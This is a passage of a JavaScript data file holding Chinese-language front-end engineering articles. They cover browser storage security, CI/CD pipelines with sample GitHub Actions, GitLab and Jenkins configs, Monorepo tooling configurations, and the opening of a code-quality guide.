- 代码审查工具
- 预提交钩子
- 开发环境安全检查

### 学习资源

**安全指南：**
- npm 安全文档
- OWASP 依赖管理指南
- Snyk 安全最佳实践
- GitHub 安全文档

**漏洞数据库：**
- CVE (Common Vulnerabilities and Exposures)：CVE是通用漏洞披露系统，为已知的安全漏洞提供唯一标识符，每个CVE编号对应一个公开披露的漏洞，如CVE-2021-44228是Log4j漏洞，CVE编号是漏洞交流和跟踪的标准方式，安全公告和漏洞数据库都使用CVE编号来标识漏洞
- NVD (National Vulnerability Database)：NVD是美国国家标准与技术研究院维护的国家漏洞数据库，收集和提供CVE漏洞的详细信息，包括漏洞描述、影响范围、严重程度评分（CVSS）、修复方案等，是查询漏洞信息的权威来源，支持按关键词、CVE编号、影响产品等条件搜索
- npm Security Advisories
- Snyk Vulnerability DB

### 案例分析

**依赖包漏洞事件：**
- event-stream 恶意包事件
- left-pad 事件
- npm 账号被盗事件
- 大型依赖漏洞影响

**安全管理效果：**
- 及时发现和修复漏洞
- 减少安全事件
- 提高开发团队安全意识
- 建立安全文化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"secure-storage",title:"前端安全存储方案",category:"security",difficulty:"medium",tags:["前端安全","安全存储","localStorage","SessionStorage","加密"],content:`## 前端安全存储方案

前端需要存储各种数据，如用户偏好、会话信息等，但如何安全地存储这些数据是一个重要的安全考虑。

### 存储方案比较

**localStorage：**
- 持久存储
- 容量约 5MB
- 同步 API
- 同源策略
- 易受 XSS 攻击

**sessionStorage：**
- 会话存储
- 容量约 5MB
- 同步 API
- 同源策略
- 会话结束后清除

**IndexedDB：**
- 大型存储
- 容量较大（视浏览器而定）
- 异步 API
- 同源策略
- 适合复杂数据

**Cookie：**
- 小型数据
- 容量约 4KB
- 随请求发送
- 可设置 HttpOnly 和 Secure
- 适合会话管理

### 安全存储策略

**数据分类：**
- 敏感数据：避免在前端存储
- 非敏感数据：可以使用 localStorage
- 会话数据：使用 sessionStorage 或 HttpOnly Cookie
- 大型数据：使用 IndexedDB

**加密存储：**
- 敏感数据加密后存储
- 使用 Web Crypto API
- 加密密钥管理
- 定期轮换密钥

**访问控制：**
- 限制存储访问权限
- 验证数据完整性
- 防止未授权访问
- 实施最小权限原则

**数据清理：**
- 定期清理过期数据
- 用户登出时清除敏感数据
- 浏览器退出时清理会话数据
- 数据删除安全

### 安全风险与防护

**XSS 攻击风险：**
- localStorage 易受 XSS 攻击
- 攻击者可以窃取存储的数据
- 防护：实施 XSS 防护措施

**CSRF 攻击风险：**
- Cookie 易受 CSRF 攻击
- 防护：实施 CSRF 防护措施

**信息泄露风险：**
- 存储的敏感信息可能泄露
- 防护：加密存储、限制存储内容

**数据篡改风险：**
- 存储的数据可能被篡改
- 防护：数据验证、加密存储

### 最佳实践

**localStorage 使用：**
- 存储非敏感数据
- 避免存储用户凭证
- 定期清理数据
- 实施数据验证

**sessionStorage 使用：**
- 存储会话相关数据
- 避免存储敏感信息
- 会话结束后自动清理
- 适合临时数据

**IndexedDB 使用：**
- 存储大型数据
- 适合复杂数据结构
- 实施访问控制
- 定期备份和清理

**Cookie 使用：**
- 使用 HttpOnly 防止 XSS
- 使用 Secure 确保 HTTPS
- 使用 SameSite 防止 CSRF
- 合理设置过期时间

### 加密技术

**Web Crypto API：**
- 浏览器内置加密功能
- 支持对称加密和非对称加密
- 安全随机数生成
- 适合前端加密需求

**加密算法选择：**
- 对称加密：AES-GCM
- 非对称加密：RSA-OAEP
- 哈希函数：SHA-256
- 签名算法：ECDSA

**密钥管理：**
- 安全生成密钥
- 密钥存储安全
- 定期轮换密钥
- 密钥备份和恢复

### 工具与库

**加密库：**
- crypto-js
- jsencrypt
- forge
- webcrypto-liner

**存储库：**
- localforage
- dexie.js
- idb
- pouchdb

**安全库：**
- helmet.js
- crypto-browserify
- secure-ls
- js-cookie

### 案例分析

**安全存储方案：**
- 金融应用的存储策略
- 医疗应用的存储策略
- 企业应用的存储策略
- 个人应用的存储策略

**安全事件分析：**
- localStorage 数据泄露事件
- Cookie 会话劫持事件
- 存储数据篡改事件
- 安全存储最佳实践效果`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"ci-cd",title:"CI/CD 持续集成与部署",category:"engineering",difficulty:"medium",tags:["工程化","CI/CD","持续集成","持续部署","自动化"],content:`## CI/CD 持续集成与部署

CI/CD (Continuous Integration/Continuous Deployment) 是现代前端工程化的核心实践，通过自动化流程提高开发效率和代码质量。

### 🔄 CI/CD 概念

**持续集成 (CI)：**
- **频繁地将代码集成到主干分支**
- **自动化构建和测试**
- **尽早发现和解决问题**
- **确保代码质量**

**持续部署 (CD)：**
- **自动化部署流程**
- **快速交付功能**
- **减少人工干预**
- **提高部署可靠性**

**持续交付 (CD)：**
- **代码随时可以部署**
- **人工批准部署**
- **平衡速度和控制**
- **适合敏感环境**

### 🛠️ CI/CD 工具

**Jenkins：**
- **开源自动化服务器**
- **丰富的插件生态**
- **高度可定制**
- **适合复杂场景**

**GitHub Actions：**
- 与 GitHub 深度集成
- 基于工作流配置
- 内置 CI/CD 功能
- 易于使用

**GitLab CI/CD：**
- 与 GitLab 集成
- 基于 .gitlab-ci.yml 配置
- 内置容器支持
- 完整的 DevOps 平台

**CircleCI：**
- 快速的构建速度
- 基于配置文件
- 并行执行能力
- 适合现代应用

**Travis CI：**
- 易于配置
- 与 GitHub 集成
- 支持多种语言
- 适合开源项目

### CI/CD 工作流

**典型工作流：**
- 代码提交 → 触发构建
- 代码检查 → 单元测试
- 构建 → 集成测试
- 部署 → 验收测试
- 发布 → 监控

**分支策略：**
- Git Flow：主分支、开发分支、特性分支：Git Flow是一种经典的Git分支管理模型，由Vincent Driessen提出，包含两个长期分支（master主分支、develop开发分支）和三种短期分支（feature特性分支、release发布分支、hotfix热修复分支），master分支始终保持生产环境可用的代码，develop分支用于集成最新的功能开发，feature分支从develop分支创建，开发完成后合并回develop，release分支从develop分支创建，用于准备发布版本，hotfix分支从master分支创建，用于紧急修复生产问题，Git Flow适合有固定发布周期的项目
- GitHub Flow：主分支、特性分支：GitHub Flow是GitHub推荐的简化分支模型，只包含一个长期分支（main主分支）和短期分支（feature特性分支），main分支始终保持可部署状态，开发者从main分支创建feature分支进行开发，开发完成后通过Pull Request合并回main分支，合并后自动触发CI/CD流程部署到生产环境，GitHub Flow适合持续部署的项目，流程简单，适合小型团队和快速迭代的项目
- GitLab Flow：环境分支：GitLab Flow是GitLab推荐的分支模型，结合了Git Flow和GitHub Flow的优点，包含主分支、环境分支（production、staging、pre-production等）和特性分支，每个环境分支对应一个部署环境，特性分支开发完成后合并到主分支，主分支通过合并触发环境分支的更新，GitLab Flow支持多环境部署，适合有多个部署环境的项目，提供了更好的环境隔离和发布控制
- Trunk-based Development：单一主干分支：Trunk-based Development是一种基于单一主干分支的开发模式，所有开发者直接在主干分支上提交代码，通过功能开关（Feature Flags）控制新功能的发布，Trunk-based Development避免了复杂的分支合并，减少了集成冲突，支持持续集成和持续部署，适合大型团队和快速迭代的项目，但需要完善的自动化测试和代码审查机制

**环境管理：**
- 开发环境
- 测试环境
- 预生产环境
- 生产环境

### CI/CD 配置

**配置文件：**
- GitHub Actions：.github/workflows/*.yml：GitHub Actions是GitHub提供的CI/CD服务，配置文件位于.github/workflows目录下，使用YAML格式定义工作流，工作流可以包含多个job，每个job包含多个step，可以配置触发条件（push、pull_request、schedule等）、环境变量、缓存策略、并行执行等，GitHub Actions与GitHub仓库深度集成，支持自托管runner，提供丰富的action市场，是GitHub项目的首选CI/CD工具
- GitLab CI：.gitlab-ci.yml：GitLab CI是GitLab内置的CI/CD服务，配置文件位于项目根目录下的.gitlab-ci.yml，使用YAML格式定义流水线，流水线可以包含多个stage，每个stage包含多个job，可以配置依赖关系、artifacts、缓存、环境变量等，GitLab CI与GitLab仓库深度集成，支持Docker、Kubernetes等部署方式，提供丰富的内置变量和模板，是GitLab项目的首选CI/CD工具
- CircleCI：.circleci/config.yml：CircleCI是云端的CI/CD服务，配置文件位于.circleci目录下的config.yml，使用YAML格式定义工作流，工作流可以包含多个job，每个job包含多个step，可以配置Docker执行环境、缓存策略、并行执行、工作流编排等，CircleCI提供免费额度，支持自托管executor，提供丰富的orb（可重用配置）市场，是跨平台项目的CI/CD选择
- Jenkins：Jenkinsfile：Jenkins是开源的自动化服务器，通过Jenkinsfile（使用Groovy编写的流水线脚本）定义CI/CD流程，支持声明式和脚本式流水线语法，可以灵活定义构建、测试、部署的各个阶段，拥有丰富的插件生态系统，可以与各种工具和服务集成，是企业级CI/CD的常用选择

**关键配置：**
- 触发条件：push、pull_request：CI/CD流水线的触发条件决定了何时执行构建和部署，常见的触发条件包括push事件（代码推送到指定分支）、pull_request事件（创建或更新Pull Request）、schedule事件（定时触发）、manual事件（手动触发）、release事件（发布Release）等，合理配置触发条件可以优化CI/CD资源使用，如只在main分支的push时触发部署，在feature分支的push时只运行测试
- 环境变量：API 密钥、部署凭证：环境变量是CI/CD流水线中存储敏感信息和配置信息的重要方式，包括API密钥、数据库连接字符串、部署凭证、第三方服务配置等，环境变量应该在CI/CD平台的Secrets中安全存储，避免硬编码在代码仓库中，环境变量可以在构建和部署过程中注入到应用程序中，确保不同环境使用不同的配置
- 缓存策略：依赖缓存：缓存策略是优化CI/CD构建速度的重要手段，常见的缓存包括依赖缓存（node_modules、vendor等）、构建缓存（webpack缓存、Docker层缓存等），缓存可以显著减少构建时间，特别是在依赖安装和编译阶段，缓存策略应该根据依赖的稳定性进行配置，对于频繁变化的依赖应该设置较短的缓存时间或禁用缓存
- 并行执行：加速构建：并行执行是优化CI/CD构建速度的重要手段，通过并行运行独立的任务（如测试、代码检查、构建等）可以显著减少总构建时间，CI/CD平台通常支持job级别的并行和step级别的并行，合理配置并行执行可以充分利用CI/CD资源，但需要注意任务之间的依赖关系和资源限制
- 部署策略：蓝绿部署、滚动部署：部署策略决定了如何将新版本的应用程序部署到生产环境，常见的部署策略包括蓝绿部署（Blue-Green Deployment，维护两套完全相同的环境，新版本部署到空闲环境后切换流量）、滚动部署（Rolling Deployment，逐步替换旧版本实例）、金丝雀部署（Canary Deployment，先向小部分用户发布新版本）、金丝雀发布（Canary Release，逐步扩大新版本的用户范围），选择合适的部署策略可以最小化部署风险和downtime

### 最佳实践

**代码质量：**
- 代码风格检查
- 静态代码分析
- 单元测试
- 覆盖率报告

**安全检查：**
- 依赖包安全扫描
- 代码安全分析
- 敏感信息检测
- 安全漏洞扫描

**部署策略：**
- 蓝绿部署：零 downtime：蓝绿部署是一种零downtime的部署策略，维护两套完全相同的环境（蓝色环境和绿色环境），当前版本运行在蓝色环境，新版本部署到绿色环境，部署完成后通过负载均衡器将流量从蓝色环境切换到绿色环境，如果发现问题可以快速切换回蓝色环境，蓝绿部署适合对downtime要求高的应用，但需要双倍的服务器资源
- 滚动部署：逐步更新：滚动部署是一种逐步替换旧版本实例的部署策略，每次替换一部分实例（如20%），验证新版本正常运行后再继续替换下一部分，直到所有实例都更新为新版本，滚动部署可以节省服务器资源，但部署过程中会同时存在新旧版本，需要注意版本兼容性和数据迁移，滚动部署适合无状态应用和可以容忍短暂版本不一致的场景
- 金丝雀部署：小流量测试：金丝雀部署是一种先向小部分用户发布新版本的部署策略，新版本先部署到少量实例（如5%），向这部分用户提供服务，观察新版本的运行情况和用户反馈，确认没有问题后逐步扩大新版本的用户范围（如10%、25%、50%、100%），金丝雀部署可以快速发现新版本的问题，降低风险，适合大型应用和需要灰度发布的场景
- 回滚机制：快速恢复：回滚机制是CI/CD流水线的重要功能，当新版本部署后发现问题需要快速恢复到上一个稳定版本，回滚机制应该支持一键回滚、自动回滚（基于健康检查或监控指标）、部分回滚（只回滚有问题的服务）等，回滚机制应该与版本管理、配置管理、数据库迁移等配合，确保回滚后系统状态一致

**监控与告警：**
- 构建状态监控
- 部署成功率
- 测试覆盖率
- 性能指标

### 集成示例

**前端项目 CI/CD：**
- 安装依赖
- 代码风格检查
- 单元测试
- 构建项目
- 部署到 CDN
- 部署到服务器

**多环境部署：**
- 开发环境：自动部署：开发环境是开发者日常开发和测试的环境，应该配置自动部署，当代码推送到开发分支时自动触发CI/CD流程，部署到开发环境，开发环境应该与生产环境保持一致的技术栈和配置，但可以使用较小的资源规模，开发环境应该支持快速迭代和频繁部署
- 测试环境：合并到 develop 分支部署：测试环境是进行集成测试和QA测试的环境，当代码合并到develop分支时自动触发CI/CD流程，部署到测试环境，测试环境应该与生产环境保持一致的配置和数据结构，但可以使用模拟的第三方服务，测试环境应该支持自动化测试和手动测试，测试环境的部署应该包含完整的测试套件
- 预生产环境：合并到 release 分支部署：预生产环境（Staging环境）是模拟生产环境进行最终测试的环境，当代码合并到release分支时自动触发CI/CD流程，部署到预生产环境，预生产环境应该与生产环境保持完全一致的配置、数据结构和第三方服务，预生产环境用于进行压力测试、安全测试、用户验收测试（UAT），确保新版本在生产环境运行稳定
- 生产环境：合并到 main 分支部署：生产环境是面向最终用户的环境，当代码合并到main分支时自动触发CI/CD流程，部署到生产环境，生产环境的部署应该经过严格的测试和审批流程，生产环境应该配置监控、告警、日志收集等系统，生产环境的部署应该支持回滚机制，确保在出现问题时可以快速恢复

### 代码示例

#### GitHub Actions 配置示例

\`\`\`yaml
# .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  # 代码检查和测试
  test:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        node-version: [16.x, 18.x]
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: \${{ matrix.node-version }}
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run linter
        run: npm run lint
      
      - name: Run type check
        run: npm run type-check
      
      - name: Run unit tests
        run: npm run test:unit
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/lcov.info
  
  # 构建项目
  build:
    runs-on: ubuntu-latest
    needs: test
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 18.x
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Build project
        run: npm run build
      
      - name: Upload build artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build
          path: dist/
  
  # 部署到开发环境
  deploy-dev:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/develop'
    
    steps:
      - name: Download build artifacts
        uses: actions/download-artifact@v3
        with:
          name: build
      
      - name: Deploy to development
        run: |
          # 部署到开发环境
          # 这里可以使用 AWS S3、Vercel、Netlify 等部署工具
          echo "Deploying to development environment"
  
  # 部署到生产环境
  deploy-prod:
    runs-on: ubuntu-latest
    needs: build
    if: github.ref == 'refs/heads/main'
    
    steps:
      - name: Download build artifacts
        uses: actions/download-artifact@v3
        with:
          name: build
      
      - name: Deploy to production
        run: |
          # 部署到生产环境
          echo "Deploying to production environment"
\`\`\`

#### GitLab CI/CD 配置示例

\`\`\`yaml
# .gitlab-ci.yml
stages:
  - test
  - build
  - deploy

variables:
  NODE_ENV: production

# 代码检查和测试
test:
  stage: test
  image: node:18
  
  before_script:
    - npm ci
  
  script:
    - npm run lint
    - npm run type-check
    - npm run test:unit
    - npm run test:coverage
  
  coverage: '/All files[^|]*\\|[^|]*\\s+([\\d\\.]+)/'
  artifacts:
    reports:
      coverage_report:
        coverage_format: cobertura
        path: coverage/cobertura-coverage.xml

# 构建项目
build:
  stage: build
  image: node:18
  
  before_script:
    - npm ci
  
  script:
    - npm run build
  
  artifacts:
    paths:
      - dist/
    expire_in: 1 week

# 部署到开发环境
deploy-dev:
  stage: deploy
  image: node:18
  
  only:
    - develop
  
  dependencies:
    - build
  
  script:
    - echo "Deploying to development environment"
    # 部署脚本

# 部署到生产环境
deploy-prod:
  stage: deploy
  image: node:18
  
  only:
    - main
  
  dependencies:
    - build
  
  script:
    - echo "Deploying to production environment"
    # 部署脚本
  
  when: manual
\`\`\`

#### Jenkins 配置示例

\`\`\`groovy
// Jenkinsfile
pipeline {
  agent any
  
  environment {
    NODE_VERSION = '18'
    CI = true
  }
  
  stages {
    stage('Checkout') {
      steps {
        checkout scm
      }
    }
    
    stage('Install') {
      steps {
        sh 'npm ci'
      }
    }
    
    stage('Lint') {
      steps {
        sh 'npm run lint'
      }
    }
    
    stage('Test') {
      steps {
        sh 'npm run test:unit'
        sh 'npm run test:coverage'
      }
      
      post {
        always {
          junit 'coverage/junit.xml'
          publishHTML(target: [
            reportDir: 'coverage',
            reportFiles: 'index.html',
            reportName: 'Coverage Report'
          ])
        }
      }
    }
    
    stage('Build') {
      steps {
        sh 'npm run build'
      }
    }
    
    stage('Deploy') {
      when {
        branch 'main'
      }
      
      steps {
        sh 'npm run deploy'
      }
    }
  }
  
  post {
    success {
      echo 'Pipeline succeeded!'
    }
    
    failure {
      echo 'Pipeline failed!'
      mail to: 'team@example.com',
           subject: "Jenkins Pipeline Failed: \${env.JOB_NAME} - \${env.BUILD_NUMBER}",
           body: "Build failed. Please check the Jenkins console output."
    }
  }
}
\`\`\`

### 工具与资源

**学习资源：**
- GitHub Actions 文档
- GitLab CI/CD 文档
- Jenkins 文档
- 持续集成与持续部署实践

**辅助工具：**
- SonarQube：代码质量分析
- Snyk：依赖安全扫描：Snyk是一个专注于依赖安全的工具，可以自动扫描项目中的开源依赖漏洞，提供修复建议和自动修复功能，支持GitHub、GitLab等代码托管平台集成，可以在CI/CD流水线中自动检测依赖安全漏洞，支持npm、yarn、pip等多种包管理器，是现代应用安全防护的重要工具
- Artifactory：制品管理：Artifactory是JFrog公司开发的制品仓库管理工具，支持Maven、npm、Docker等多种包格式，提供制品存储、版本管理、访问控制、依赖解析等功能，可以作为私有npm仓库、Docker镜像仓库使用，支持高可用部署和大规模二进制文件存储，是企业级制品管理的标准选择
- Prometheus：监控：Prometheus是开源的系统监控和告警工具，由SoundCloud开发并成为CNCF毕业项目，广泛用于云原生应用监控，通过拉取模式收集指标数据，支持多维度数据模型和强大的查询语言PromQL，可以与Grafana集成实现可视化，提供灵活的告警规则和通知渠道，是现代分布式系统监控的主流选择

### 案例分析

**大型项目 CI/CD：**
- Google 的 CI/CD 实践
- Facebook 的 CI/CD 实践
- Netflix 的 CI/CD 实践
- 阿里巴巴的 CI/CD 实践

**实施效果：**
- 开发效率提升
- 代码质量改善
- 部署可靠性提高
- 团队协作优化

### 最佳实践

**代码质量：**
- 代码风格检查
- 静态代码分析
- 单元测试
- 覆盖率报告

**安全检查：**
- 依赖包安全扫描
- 代码安全分析
- 敏感信息检测
- 安全漏洞扫描

**部署策略：**
- 蓝绿部署：零 downtime
- 滚动部署：逐步更新
- 金丝雀部署：小流量测试
- 回滚机制：快速恢复

**监控与告警：**
- 构建状态监控
- 部署成功率
- 测试覆盖率
- 性能指标

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"monorepo",title:"Monorepo 管理策略",category:"engineering",difficulty:"medium",tags:["工程化","Monorepo","代码管理","工具链"],content:`## Monorepo 管理策略

Monorepo 是一种代码管理策略，将多个项目或包放在一个代码仓库中管理，适合大型前端项目和多团队协作。

### Monorepo 概念

**定义：**
- 单一代码仓库
- 包含多个项目或包
- 共享依赖和工具
- 统一的开发流程

**优势：**
- 代码共享：减少重复代码
- 依赖管理：统一版本控制
- 跨项目协作：便于代码复用
- 原子提交：关联变更一起提交
- 统一的构建和测试

**挑战：**
- 仓库体积增大
- 构建时间延长
- 权限管理复杂
- 工具链要求高

### Monorepo vs Multirepo

**Monorepo 优势：**
- 统一的版本管理
- 原子提交：跨包变更一起提交
- 代码共享：减少重复
- 简化的依赖管理
- 统一的 CI/CD

**Multirepo 优势：**
- 独立的版本控制
- 灵活的权限管理
- 更小的仓库体积
- 独立的 CI/CD
- 更快的克隆速度

**选择建议：**
- Monorepo：适合紧密相关的项目、共享代码多、团队协作频繁：Monorepo是一种将多个项目集中在一个代码仓库中管理的策略，特别适合需要共享代码的微前端项目、多包npm库、企业内部工具链等场景，优势包括统一版本管理、原子提交（一次提交可以同时修改多个包）、便捷的代码共享、简化的依赖管理，典型代表是Babel、React、Angular等大型开源项目都采用Monorepo管理
- Multirepo：适合独立的项目、权限隔离要求高、发布周期不同：Multirepo是传统的多仓库管理策略，每个项目或包有独立的代码仓库，适合团队规模较大、需要严格的权限控制、不同项目有不同的发布周期的场景，优势包括仓库体积小（克隆速度快）、独立的CI/CD流水线、灵活的权限管理，缺点是跨仓库代码共享困难、依赖版本管理复杂、原子提交无法实现

### Monorepo 工具

**Turborepo：**
- 由 Vercel 开发
- 高性能构建系统
- 智能缓存
- 适合 JavaScript/TypeScript 项目

**pnpm workspace：**
- 快速的包管理
- 节省磁盘空间
- 支持 workspace 配置
- 适合 Node.js 项目

**Nx：**
- 强大的代码生成
- 智能缓存
- 依赖图分析
- 适合 Angular 和 React 项目

**Lerna：**
- 成熟的 Monorepo 工具
- 版本管理
- 发布管理
- 适合 npm 包管理

**Rush：**
- 由 Microsoft 开发
- 高性能
- 严格的版本控制
- 适合大型企业项目

### Monorepo 结构

**目录结构：**
- packages/：存放所有包
- apps/：存放应用
- configs/：共享配置
- scripts/：共享脚本
- docs/：文档

**包类型：**
- 应用包：完整的应用
- 库包：可重用的代码
- 工具包：构建和开发工具
- 配置包：共享配置

**依赖管理：**
- 根级依赖：共享依赖
- 包级依赖：特定包的依赖
- 版本管理：统一版本控制
- 依赖解析：避免版本冲突

### 工作流程

**开发流程：**
- 分支策略：feature、bugfix、release
- 代码审查：跨包变更审查
- 测试策略：单元测试、集成测试
- 构建策略：增量构建、并行构建

**发布流程：**
- 版本管理：语义化版本
- 变更日志：自动生成
- 发布策略：独立发布、批量发布
- 回滚机制：快速回滚

**CI/CD 集成：**
- 增量 CI：只构建变更的包
- 缓存策略：缓存构建结果
- 测试策略：只测试相关包
- 部署策略：按环境部署

### 最佳实践

**代码组织：**
- 合理划分包边界
- 清晰的依赖关系
- 避免循环依赖
- 统一的代码规范

**性能优化：**
- 增量构建
- 智能缓存
- 并行执行
- 按需构建

**版本管理：**
- 语义化版本
- 自动版本控制
- 变更日志生成
- 发布流程自动化

**团队协作：**
- 清晰的贡献指南
- 代码审查流程
- 文档管理
- 知识共享

### 工具配置

**Turborepo 配置：**

\`\`\`json
// turbo.json
{
  "$schema": "https://turbo.build/schema.json",
  "pipeline": {
    "build": {
      "dependsOn": ["^build"],
      "outputs": ["dist/**", ".next/**", "!.next/cache/**"],
      "cache": true
    },
    "test": {
      "dependsOn": ["build"],
      "outputs": [],
      "cache": true
    },
    "lint": {
      "outputs": [],
      "cache": true
    },
    "dev": {
      "cache": false,
      "persistent": true
    }
  }
}
\`\`\`

**pnpm workspace 配置：**

\`\`\`json
// pnpm-workspace.yaml
packages:
  - 'apps/*'
  - 'packages/*'
  - 'configs/*'

// package.json (根目录)
{
  "name": "my-monorepo",
  "private": true,
  "scripts": {
    "dev": "turbo run dev",
    "build": "turbo run build",
    "test": "turbo run test",
    "lint": "turbo run lint",
    "clean": "turbo run clean && rm -rf node_modules"
  },
  "devDependencies": {
    "turbo": "^1.10.0",
    "typescript": "^5.0.0"
  }
}
\`\`\`

**Nx 配置：**

\`\`\`json
// nx.json
{
  "$schema": "./node_modules/nx/schemas/nx-schema.json",
  "npmScope": "my-org",
  "affected": {
    "defaultBase": "main"
  },
  "cli": {
    "defaultCollection": "@nx/react"
  },
  "tasksRunnerOptions": {
    "default": {
      "runner": "nx/tasks-runners/default",
      "options": {
        "cacheableOperations": ["build", "test", "lint", "e2e"]
      }
    }
  },
  "workspaceLayout": {
    "appsDir": "apps",
    "libsDir": "packages"
  }
}

// tsconfig.base.json
{
  "compilerOptions": {
    "composite": true,
    "declaration": true,
    "declarationMap": true,
    "paths": {
      "@my-org/ui": ["packages/ui/src/index.ts"],
      "@my-org/utils": ["packages/utils/src/index.ts"],
      "@my-org/types": ["packages/types/src/index.ts"]
    }
  }
}
\`\`\`

### 项目结构示例

\`\`\`
my-monorepo/
├── apps/
│   ├── web/                    # Web 应用
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── App.tsx
│   │       └── main.tsx
│   └── admin/                  # 管理后台
│       ├── package.json
│       ├── tsconfig.json
│       └── src/
│           └── main.tsx
├── packages/
│   ├── ui/                     # UI 组件库
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── Button.tsx
│   │       ├── Input.tsx
│   │       └── index.ts
│   ├── utils/                  # 工具函数
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── format.ts
│   │       ├── validate.ts
│   │       └── index.ts
│   └── types/                  # 类型定义
│       ├── package.json
│       ├── tsconfig.json
│       └── src/
│           └── index.ts
├── configs/
│   ├── eslint/
│   ├── prettier/
│   └── tsconfig/
├── scripts/
│   ├── release.js
│   └── clean.js
├── package.json
├── pnpm-workspace.yaml
├── turbo.json
└── tsconfig.base.json
\`\`\`

### 包依赖示例

\`\`\`json
// packages/ui/package.json
{
  "name": "@my-org/ui",
  "version": "1.0.0",
  "main": "./dist/index.js",
  "types": "./dist/index.d.ts",
  "scripts": {
    "build": "tsc",
    "dev": "tsc --watch",
    "lint": "eslint src",
    "test": "jest"
  },
  "dependencies": {
    "@my-org/utils": "workspace:*",
    "@my-org/types": "workspace:*"
  },
  "peerDependencies": {
    "react": "^18.0.0",
    "react-dom": "^18.0.0"
  },
  "devDependencies": {
    "@types/react": "^18.0.0",
    "@types/react-dom": "^18.0.0",
    "typescript": "^5.0.0"
  }
}

// apps/web/package.json
{
  "name": "@my-org/web",
  "version": "1.0.0",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview",
    "lint": "eslint src",
    "test": "vitest"
  },
  "dependencies": {
    "@my-org/ui": "workspace:*",
    "@my-org/utils": "workspace:*",
    "@my-org/types": "workspace:*",
    "react": "^18.0.0",
    "react-dom": "^18.0.0",
    "react-router-dom": "^6.0.0"
  },
  "devDependencies": {
    "@types/react": "^18.0.0",
    "@types/react-dom": "^18.0.0",
    "vite": "^4.0.0",
    "typescript": "^5.0.0"
  }
}
\`\`\`

### CI/CD 集成

\`\`\`yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup pnpm
        uses: pnpm/action-setup@v2
        with:
          version: 8
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 18
          cache: 'pnpm'
      
      - name: Install dependencies
        run: pnpm install --frozen-lockfile
      
      - name: Run linter
        run: pnpm run lint
      
      - name: Run tests
        run: pnpm run test
      
      - name: Build
        run: pnpm run build
\`\`\`

### 最佳实践

**代码组织：**
- 合理划分包边界
- 清晰的依赖关系
- 避免循环依赖
- 统一的代码规范

**性能优化：**
- 增量构建
- 智能缓存
- 并行执行
- 按需构建

**版本管理：**
- 语义化版本
- 自动版本控制
- 变更日志生成
- 发布流程自动化

**团队协作：**
- 清晰的贡献指南
- 代码审查流程
- 文档管理
- 知识共享

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"code-quality",title:"代码质量与规范",category:"engineering",difficulty:"medium",tags:["工程化","代码质量","代码规范","ESLint","Prettier"],content:`## 代码质量与规范

代码质量和规范是前端工程化的重要组成部分，影响着代码的可维护性、可读性和可靠性。

### 代码质量概念

**定义：**
- 代码的可维护性
- 代码的可读性
- 代码的可靠性
- 代码的性能

**重要性：**
- 减少 bug
- 提高开发效率
- 便于团队协作
- 降低维护成本

**衡量指标：**
- 代码覆盖率
- 圈复杂度
- 代码重复率
- 静态分析结果

### 代码规范工具

**ESLint：**
- 代码质量检查
- 语法错误检测
- 代码风格检查
- 可定制规则

**Prettier：**
- 代码格式化
- 统一代码风格
- 减少代码审查冲突
- 支持多种语言

**Stylelint：**
- CSS 代码检查
- 样式规范
- 避免样式错误
- 提高样式可维护性

**Commitlint：**
- 提交信息规范
- 统一提交格式
- 便于自动化工具
- 提高提交信息可读性

### 代码规范配置

**ESLint 配置：**
- 基础配置：eslint:recommended
- 框架配置：@typescript-eslint/recommended, plugin:react/recommended
- 自定义规则：根据团队需求
- 忽略文件：.eslintignore

**Prettier 配置：**
- 缩进：2 空格或 4 空格
- 引号：单引号或双引号
- 分号：是否使用
- 尾随逗号：是否使用

**Stylelint 配置：**
- 基础配置：stylelint-config-standard
- 自定义规则：根据项目需求
- 忽略文件：.stylelintignore

**Commitlint 配置：**
- 配置：@commitlint/config-conventional
- 提交格式：type(scope): subject
- 类型：feat, fix, docs, style, refactor, test, chore

### 集成与自动化

**编辑器集成：**
- VS Code：ESLint, Prettier 插件
- WebStorm：内置支持
- Sublime Text：插件支持
- 自动格式化和检查

**Git 钩子：**
- pre-commit：提交前检查
- pre-push：推送前检查
- commit-msg：提交信息检查
- 使用 husky 管理钩子

**CI/CD 集成：**
- 代码质量检查
- 代码风格检查
- 测试覆盖率
- 静态分析

### 代码审查

**审查流程：**
- 提交代码 → 创建 PR
- 自动检查 → 人工审查
- 代码讨论 → 修复问题
- 合并代码 → 部署

**审查要点：**
- 代码质量：逻辑正确性
- 代码风格：符合规范
- 性能：是否优化
- 安全：是否有漏洞
- 测试：是否有测试

**审查工具：**
- GitHub Pull Requests
- GitLab Merge Requests
- Bitbucket Pull Requests
- CodeReview 平台

### 最佳实践

**编码规范：**
- 变量命名：语义化
- 函数长度：控制在 50 行内
- 代码注释：关键逻辑注释
- 错误处理：合理的错误处理

**团队协作：**
- 统一的代码规范
- 定期代码审查
- 代码质量监控
- 持续改进

**工具链：**
- 统一的开发环境
